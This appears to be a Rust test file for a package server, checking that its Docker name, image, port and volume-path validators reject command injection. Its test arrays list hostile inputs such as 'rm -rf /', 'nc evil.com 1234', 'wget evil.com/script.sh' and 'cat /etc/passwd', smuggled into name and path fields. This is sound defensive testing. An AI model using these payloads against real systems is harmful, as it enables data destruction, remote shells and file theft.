//! Docker Security Tests
//!
//! This module verifies the security improvements for Docker command handling.
//! Tests ensure that Docker command injection vulnerabilities have been
//! properly mitigated through validation and input sanitization.

/// Docker Security Test - Demonstrates the security improvements
///
/// This test file shows how the Docker command injection vulnerabilities
/// have been fixed with proper validation and escaping.
use vm_package_server::validation::{
    sanitize_docker_name, validate_docker_image_name, validate_docker_port,
    validate_docker_volume_path, ValidationError,
};

#[cfg(test)]
mod docker_security_tests {
    use super::*;

    #[test]
    fn test_container_name_injection_blocked() {
        // Malicious container names that could enable injection attacks
        let malicious_names = [
            "container; rm -rf /",
            "container && curl evil.com",
            "container`whoami`",
            "container$(id)",
            "container|cat /etc/passwd",
            "container\nrm -rf /",
            "container\0evil",
        ];

        for name in malicious_names {
            println!("Testing malicious container name: {}", name);
            assert!(
                sanitize_docker_name(name).is_err(),
                "Container name '{}' should be rejected but was allowed",
                name
            );
        }
    }

    #[test]
    fn test_port_injection_blocked() {
        // Port 0 is invalid for Docker
        assert!(validate_docker_port(0).is_err());

        // Valid ports should pass
        assert!(validate_docker_port(80).is_ok());
        assert!(validate_docker_port(8080).is_ok());
        assert!(validate_docker_port(65535).is_ok());
    }

    #[test]
    fn test_image_name_injection_blocked() {
        let malicious_images = [
            "image; rm -rf /",
            "image && wget evil.com/script.sh",
            "image`whoami`",
            "image$(curl evil.com)",
            "image|nc evil.com 1234",
            "image with spaces",
            "image\necho 'hacked'",
            "image'with'quotes",
            "image\"with\"doublequotes",
        ];

        for image in malicious_images {
            println!("Testing malicious image name: {}", image);
            assert!(
                validate_docker_image_name(image).is_err(),
                "Image name '{}' should be rejected but was allowed",
                image
            );
        }

        // Valid image names should pass
        assert!(validate_docker_image_name("nginx").is_ok());
        assert!(validate_docker_image_name("nginx:latest").is_ok());
        assert!(validate_docker_image_name("registry.com/namespace/image:tag").is_ok());
    }

    #[test]
    fn test_volume_path_injection_blocked() {
        let malicious_paths = [
            "/path; rm -rf /",
            "/path && cat /etc/passwd",
            "/path`whoami`",
            "/path$(id)",
            "/path|nc evil.com 1234",
            "/path with$variables",
            "/path/with;semicolon",
            "/path/with&ampersand",
            "/path/with|pipe",
            "/path/with`backtick",
            "/path/with(parentheses)",
            "/path/with{braces}",
            "/path/with[brackets]",
        ];

        for path in malicious_paths {
            println!("Testing malicious volume path: {}", path);
            assert!(
                validate_docker_volume_path(path).is_err(),
                "Volume path '{}' should be rejected but was allowed",
                path
            );
        }

        // Relative paths should be rejected
        assert!(validate_docker_volume_path("relative/path").is_err());
        assert!(validate_docker_volume_path("./relative/path").is_err());
        assert!(validate_docker_volume_path("../parent/path").is_err());

        // Valid absolute paths should pass
        assert!(validate_docker_volume_path("/home/user/data").is_ok());
        assert!(validate_docker_volume_path("/var/lib/app").is_ok());
    }

    #[test]
    fn test_validation_error_types() {
        // Test that specific validation errors are returned
        match sanitize_docker_name("") {
            Err(ValidationError::TooShort { actual, min }) => {
                assert_eq!(actual, 0);
                assert_eq!(min, 1);
            }
            _ => panic!("Expected TooShort error for empty container name"),
        }

        match validate_docker_port(0) {
            Err(ValidationError::InvalidFormat { reason }) => {
                assert!(reason.contains("Port 0 is not valid"));
            }
            _ => panic!("Expected InvalidFormat error for port 0"),
        }

        match validate_docker_volume_path("relative/path") {
            Err(ValidationError::InvalidFormat { reason }) => {
                assert!(reason.contains("must be absolute"));
            }
            _ => panic!("Expected InvalidFormat error for relative path"),
        }
    }

    #[test]
    fn test_valid_docker_parameters_pass() {
        // Test that legitimate Docker parameters are not blocked
        assert!(sanitize_docker_name("goobits-pkg-server-8080").is_ok());
        assert!(sanitize_docker_name("my-app-container").is_ok());
        assert!(sanitize_docker_name("app123").is_ok());

        assert!(validate_docker_port(80).is_ok());
        assert!(validate_docker_port(443).is_ok());
        assert!(validate_docker_port(8080).is_ok());

        assert!(validate_docker_image_name("goobits-pkg-server:latest").is_ok());
        assert!(validate_docker_image_name("alpine:3.18").is_ok());
        assert!(validate_docker_image_name("registry.example.com/org/repo:v1.0.0").is_ok());

        assert!(validate_docker_volume_path("/home/appuser/data").is_ok());
        assert!(validate_docker_volume_path("/var/lib/docker/volumes/data").is_ok());
    }
}
